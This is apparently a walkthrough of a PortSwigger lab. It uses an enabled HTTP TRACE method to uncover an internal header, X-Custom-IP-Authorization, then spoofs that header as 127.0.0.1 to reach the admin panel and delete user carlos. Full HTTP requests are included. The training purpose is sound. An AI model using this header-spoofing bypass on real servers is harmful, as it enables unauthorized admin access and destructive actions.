## Lab Description :

![image](https://github.com/sh3bu/Portswigger_labs/assets/67383098/d31747c2-0464-4c47-a363-380162d1272c)

## Overview :

- Developers might forget to *disable various* debugging options in the production environment.


> For example, the `HTTP TRACE` method is designed for diagnostic purposes. If enabled, the web server will respond to requests that use the `TRACE` method by echoing in the
> response the exact request that was received. This behavior is often harmless, but occasionally **leads to information disclosure, such as the name of internal
> authentication headers that may be appended to requests** by reverse proxies. 

## Solution :

#### Analysing the login functionality -

Once the lab loads, we login as wiener and intercept the requests by using burp.

2 requests are sent when logging in.

1. POST request with the username & password which we entered.

```http
post /login HTTP/2
Host: 0adf00a2045c466b808d85e200c2005a.web-security-academy.net
Cookie: session=9Q5EQgtqUhCdLQ2FwiRdbEL9QT5axZ9O
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 68
Origin: https://0adf00a2045c466b808d85e200c2005a.web-security-academy.net
Referer: https://0adf00a2045c466b808d85e200c2005a.web-security-academy.net/login
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Te: trailers
Connection: close

csrf=YhxPLgTtgTrqeTnp5bwb3G4tt9hGiymf&username=wiener&password=peter
```


2. GET request with parameter `?id=wiener`.

```http
GET /my-account?id=wiener HTTP/2
Host: 0adf00a2045c466b808d85e200c2005a.web-security-academy.net
Cookie: session=Cg9Tz6WFnRqBebiW7cfpYpvb1QUuybt8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://0adf00a2045c466b808d85e200c2005a.web-security-academy.net/login
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Te: trailers
```

####  HTTP methods -

In order to  bypass the authentication & have admin access, we have to check what HTTP methods are used.

First let's try **OPTIONS** header to see what HTTP headers are allowed in this request but sadly it didn't return anything.

So next, we will try each of the methods **PUT,PATCH,DELETE,TRACE**.

All the headers gave nothing interesting in response except **TRACE**.

The  request sent is as follows

```http
TRACE /my-account?id=carlos HTTP/2
Host: 0adf00a2045c466b808d85e200c2005a.web-security-academy.net
Cookie: session=Cg9Tz6WFnRqBebiW7cfpYpvb1QUuybt8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://0adf00a2045c466b808d85e200c2005a.web-security-academy.net/login
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Te: trailers
```

The response with `TRACE` http header was,

```http
HTTP/2 200 OK
Content-Type: message/http
X-Frame-Options: SAMEORIGIN
Content-Length: 696

TRACE /my-account?id=carlos HTTP/1.1
Host: 0adf00a2045c466b808d85e200c2005a.web-security-academy.net
user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0
accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
accept-language: en-US,en;q=0.5
accept-encoding: gzip, deflate
referer: https://0adf00a2045c466b808d85e200c2005a.web-security-academy.net/login
upgrade-insecure-requests: 1
sec-fetch-dest: document
sec-fetch-mode: navigate
sec-fetch-site: same-origin
sec-fetch-user: ?1
te: trailers
cookie: session=Cg9Tz6WFnRqBebiW7cfpYpvb1QUuybt8
Content-Length: 0
X-Custom-IP-Authorization: 152.58.224.8
```

> **TRACE** method **echoes  the exact same request that was received in the response** . This behavior is often harmless, but occasionally leads to *information disclosure*, such as the name of internal authentication headers that may be appended to requests

From the above response, we can understand that **X-Custom-IP-Authorization** header is supported . So we can use it in the request.

> NOTE - By using `X-Custom-Authorization` header we can spoof our IP addresses. EG- `X-Custom-Authorization: 127.0.0.1`

So if we spoof our IP as localhost, maybe sometimes the website will not validate it since it is coming from a trusted server. So by this way it will help us access the admin panel without admin credentials.

We now send a request like thi ,

```http
GET /my-account?id=carlos HTTP/2
Host: 0adf00a2045c466b808d85e200c2005a.web-security-academy.net
Cookie: session=Cg9Tz6WFnRqBebiW7cfpYpvb1QUuybt8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://0adf00a2045c466b808d85e200c2005a.web-security-academy.net/login
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Te: trailers
X-Custom-Ip-Authorization: 127.0.0.1
```

In the response we have a link to `/admin` panel

```
<a href="/admin">Admin panel</a><p>|</p>
<a href="/my-account?id=wiener">My account</a><p>
```

Now send another request to access `/admin` panel  with the same X-Custom-Authorization header.  

```http
GET /admin HTTP/2
Host: 0adf00a2045c466b808d85e200c2005a.web-security-academy.net
Cookie: session=Cg9Tz6WFnRqBebiW7cfpYpvb1QUuybt8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://0adf00a2045c466b808d85e200c2005a.web-security-academy.net/my-account?id=carlos
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Te: trailers
X-Custom-Ip-Authorization: 127.0.0.1
```
In the reponse we get the href link to delete user carlos .

```html
                       <div>
                            <span>carlos - </span>
                            <a href="/admin/delete?username=carlos">Delete</a>
                        </div>
```

Again one last time, send a *POST* request to `/admin/delete?username=carlos` endpoint (along with the custom header) to delete user carlos & Solve the lab.

![image](https://github.com/sh3bu/Portswigger_labs/assets/67383098/e5ca816b-480b-466d-9c50-bb6ffb368c79)





